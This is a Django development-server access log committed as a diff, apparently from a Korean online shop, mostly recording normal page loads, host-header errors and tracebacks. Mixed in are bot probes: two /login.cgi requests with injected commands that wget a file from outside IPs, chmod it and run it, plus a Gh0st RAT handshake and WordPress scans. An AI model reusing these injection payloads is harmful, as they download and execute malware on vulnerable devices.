@@ -1,0 +1,1456 @@
+[13/Aug/2018 19:57:51] "GET / HTTP/1.1" 200 5787
+[13/Aug/2018 19:57:51] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[13/Aug/2018 19:57:51] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[13/Aug/2018 19:57:51] "GET /static/shop/assets/logo.png HTTP/1.1" 200 12947
+[13/Aug/2018 19:57:51] "GET /static/shop/assets/buttonRight.png HTTP/1.1" 200 1949
+[13/Aug/2018 19:57:51] "GET /static/shop/assets/buttonLeft.png HTTP/1.1" 200 1972
+[13/Aug/2018 19:57:52] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 951536
+[13/Aug/2018 19:57:52] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_150.png HTTP/1.1" 200 962166
+[13/Aug/2018 19:57:52] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 2061638
+[13/Aug/2018 19:57:53] "GET /static/shop/assets/m2_cont_1.png HTTP/1.1" 200 461965
+[13/Aug/2018 19:57:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 3326137
+[13/Aug/2018 19:57:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 2973646
+[13/Aug/2018 19:57:53] "GET /static/shop/assets/m2_cont_2.png HTTP/1.1" 200 483239
+[13/Aug/2018 19:57:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 2136101
+[13/Aug/2018 19:57:53] "GET /static/shop/assets/m2_cont_3.png HTTP/1.1" 200 520911
+[13/Aug/2018 19:57:53] "GET /static/shop/assets/banner1.png HTTP/1.1" 200 1429918
+[13/Aug/2018 19:57:53] "GET /static/shop/assets/map.png HTTP/1.1" 200 397536
+Not Found: /favicon.ico
+[13/Aug/2018 19:57:54] "GET /favicon.ico HTTP/1.1" 404 5612
+[13/Aug/2018 19:57:54] "GET /products/ HTTP/1.1" 200 12020
+[13/Aug/2018 19:57:55] "GET /static/shop/css/product.css HTTP/1.1" 200 1411
+[13/Aug/2018 19:57:55] "GET /static/shop/css/login.css HTTP/1.1" 200 1236
+[13/Aug/2018 19:57:55] "GET /static/shop/css/intro.css HTTP/1.1" 200 2284
+[13/Aug/2018 19:57:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_60.png HTTP/1.1" 200 2437000
+[13/Aug/2018 19:57:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 2040655
+[13/Aug/2018 19:57:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0500.png HTTP/1.1" 200 2095051
+[13/Aug/2018 19:57:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0300.png HTTP/1.1" 200 2117482
+[13/Aug/2018 19:58:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300_ASLaGNj.png HTTP/1.1" 200 2667490
+[13/Aug/2018 19:58:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 2667490
+[13/Aug/2018 19:58:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_300.png HTTP/1.1" 200 919139
+[13/Aug/2018 19:58:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0800.png HTTP/1.1" 200 2066120
+[13/Aug/2018 19:58:01] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EC%95%84%EC%9F%81.png HTTP/1.1" 200 2833798
+[13/Aug/2018 19:58:01] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EC%95%84%EC%9F%81.png HTTP/1.1" 200 2849930
+[13/Aug/2018 19:58:06] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88_%EB%AA%85%EC%A3%BC%EC%8B%A4_30.png HTTP/1.1" 200 5788675
+[13/Aug/2018 19:58:06] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EB%AA%85%EC%A3%BC%EC%8B%A430.png HTTP/1.1" 200 3180856
+[13/Aug/2018 19:58:07] "GET /media/Products/mainImg/%EC%95%84%EC%9F%81%EB%AA%85%EC%A3%BC%EC%8B%A4.png HTTP/1.1" 200 4451949
+[13/Aug/2018 19:58:10] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0%EB%B0%9B%EC%B9%A8%EB%8C%8035.png HTTP/1.1" 200 5921526
+[13/Aug/2018 19:58:11] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EC%95%88%EC%A1%B115.png HTTP/1.1" 200 3499459
+[13/Aug/2018 19:58:11] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88%EC%95%88%EC%A1%B130%EB%A7%8C.png HTTP/1.1" 200 5278346
+[13/Aug/2018 19:58:12] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%88%A0%EB%8C%80.png HTTP/1.1" 200 416613
+[13/Aug/2018 19:58:12] "GET /media/Products/mainImg/%EA%B3%A8%EB%AC%B4.png HTTP/1.1" 200 6301357
+[13/Aug/2018 19:58:14] "GET /media/Products/mainImg/%EB%8B%A8%EC%86%8C7%EB%A7%8C.png HTTP/1.1" 200 3284899
+[13/Aug/2018 19:58:16] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EB%B3%B4%EB%A9%B4%EB%8C%803%EB%A7%8C5%EC%B2%9C.png HTTP/1.1" 200 3213025
+[13/Aug/2018 19:58:17] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88%EB%B0%9B%EC%B9%A8%EB%8C%80.png HTTP/1.1" 200 13226576
+[13/Aug/2018 19:58:17] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0%EC%95%89%EC%9D%80%EB%B0%9B%EC%B9%A8%EB%8C%80.png HTTP/1.1" 200 13094993
+[13/Aug/2018 19:59:44] "GET / HTTP/1.1" 200 5787
+[13/Aug/2018 19:59:48] "GET /products/ HTTP/1.1" 200 12020
+[13/Aug/2018 19:59:58] "GET /accounts/login/ HTTP/1.1" 200 3095
+[13/Aug/2018 20:00:03] "GET /accounts/signup/ HTTP/1.1" 200 4804
+[13/Aug/2018 20:00:07] "GET /accounts/login/ HTTP/1.1" 200 3095
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+Bad Request: /http:/www.baidu.com/cache/global/img/gs.gif
+[13/Aug/2018 20:00:50] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59253
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 20:17:59] "GET / HTTP/1.1" 400 59339
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 21:21:37] "GET / HTTP/1.1" 400 58771
+[13/Aug/2018 21:30:17] "GET / HTTP/1.1" 200 5787
+[13/Aug/2018 21:30:17] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 21:34:07] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 21:48:16] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 21:59:36] "GET / HTTP/1.1" 400 58777
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 22:09:28] "HEAD / HTTP/1.1" 400 58500
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[13/Aug/2018 22:09:28] "HEAD / HTTP/1.1" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Not Found: //wp-login.php
+[13/Aug/2018 22:14:34] "GET //wp-login.php HTTP/1.1" 404 5618
+Not Found: //xmlrpc.php
+[13/Aug/2018 22:15:42] "GET //xmlrpc.php HTTP/1.1" 404 5612
+Not Found: /robots.txt
+[13/Aug/2018 22:35:19] "GET /robots.txt HTTP/1.1" 404 5616
+[13/Aug/2018 22:35:23] "GET / HTTP/1.1" 200 5787
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 23:14:12] "GET / HTTP/1.1" 400 58767
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 23:26:35] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Aug/2018 23:33:07] "GET / HTTP/1.1" 400 58768
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 00:25:01] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 00:27:33] "GET / HTTP/1.1" 400 59166
+[14/Aug/2018 00:30:24] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 00:30:28] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 00:30:36] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 00:30:38] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 01:01:59] "GET / HTTP/1.1" 400 58767
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 01:11:19] "GET / HTTP/1.1" 400 59356
+[14/Aug/2018 01:17:49] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 01:17:58] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 01:29:13] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 01:29:21] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 01:45:51] "GET / HTTP/1.1" 400 58775
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 01:47:08] "GET / HTTP/1.1" 400 59026
+[14/Aug/2018 01:52:03] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 01:52:03] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Not Found: /login.cgi
+[14/Aug/2018 01:59:31] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.67.245/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5712
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 02:16:10] "GET / HTTP/1.1" 400 59539
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 02:43:00] "GET / HTTP/1.1" 400 58777
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 02:54:55] "GET / HTTP/1.1" 400 58766
+Not Found: /robots.txt
+[14/Aug/2018 02:59:59] "GET /robots.txt HTTP/1.1" 404 5609
+Not Found: /robots.txt
+[14/Aug/2018 03:00:00] "GET /robots.txt HTTP/1.1" 404 5609
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 03:02:13] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 03:33:14] "GET / HTTP/1.1" 400 58769
+[14/Aug/2018 03:38:54] "GET / HTTP/1.0" 200 5787
+[14/Aug/2018 03:41:52] "GET / HTTP/1.0" 200 5787
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 03:49:02] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 03:52:54] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 04:26:28] "GET / HTTP/1.1" 400 59317
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 05:08:19] "GET / HTTP/1.1" 400 58927
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 05:10:00] "GET / HTTP/1.1" 400 58777
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+Bad Request: /http:/www.baidu.com/cache/global/img/gs.gif
+[14/Aug/2018 05:14:57] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59253
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 05:37:05] "GET / HTTP/1.1" 400 58903
+Not Found: /login.cgi
+[14/Aug/2018 05:47:12] "GET /login.cgi?cli=aa%20aa%27;wget%20http://212.237.32.62/k%20-O%20-%3E%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5719
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 05:47:33] "GET / HTTP/1.1" 400 59137
+[14/Aug/2018 06:10:10] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 06:10:17] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 06:16:00] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 06:16:00] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 08:13:16] "GET / HTTP/1.1" 400 59354
+[14/Aug/2018 08:16:54] code 400, message Bad request syntax ("Gh0st\xad\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\tH\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11\xa0\x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯]")
+[14/Aug/2018 08:16:54] "Gh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯]" 400 -
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 08:22:25] "GET / HTTP/1.1" 400 59166
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 09:36:50] "GET / HTTP/1.1" 400 59046
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 09:54:10] "GET / HTTP/1.1" 400 60148
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 09:54:10] "GET /favicon.ico HTTP/1.1" 400 59417
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 10:02:38] "GET / HTTP/1.1" 400 60283
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 10:02:39] "GET /favicon.ico HTTP/1.1" 400 60366
+[14/Aug/2018 10:39:50] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 10:39:50] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xmlrpc.php
+[14/Aug/2018 10:45:52] "GET /xmlrpc.php HTTP/1.1" 400 58951
+[14/Aug/2018 10:58:27] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 10:58:36] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 11:31:48] "GET / HTTP/1.1" 400 58767
+Not Found: /robots.txt
+[14/Aug/2018 11:37:31] "GET /robots.txt HTTP/1.1" 404 5609
+[14/Aug/2018 11:37:33] "GET / HTTP/1.1" 200 5787
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:02:27] "GET / HTTP/1.1" 400 58768
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:04:51] "GET / HTTP/1.1" 400 58770
+[14/Aug/2018 12:17:47] "GET / HTTP/1.1" 200 5787
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:20:08] "GET / HTTP/1.1" 400 59318
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:20:59] "GET / HTTP/1.1" 400 58775
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:37:08] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:50:00] "GET / HTTP/1.0" 400 59235
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[14/Aug/2018 12:50:00] "GET / HTTP/1.0" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 12:55:47] "GET / HTTP/1.1" 400 58777
+[14/Aug/2018 13:26:50] "GET / HTTP/1.0" 200 5787
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 13:31:24] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 13:32:02] "GET / HTTP/1.1" 400 60283
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 13:32:03] "GET /favicon.ico HTTP/1.1" 400 60366
+Not Found: /robots.txt
+[14/Aug/2018 14:01:48] "GET /robots.txt HTTP/1.1" 404 5609
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[14/Aug/2018 14:01:48] "GET /robots.txt HTTP/1.1" 400 59542
+Not Found: /index_a.php
+[14/Aug/2018 14:01:49] "GET /index_a.php HTTP/1.1" 404 5612
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 14:01:54] "GET / HTTP/1.1" 400 59574
+[14/Aug/2018 14:07:22] "GET / HTTP/1.1" 200 5787
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+Bad Request: /http:/www.baidu.com/cache/global/img/gs.gif
+[14/Aug/2018 14:27:04] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59253
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 14:55:36] "GET / HTTP/1.1" 400 58774
+[14/Aug/2018 15:03:36] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 15:03:36] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
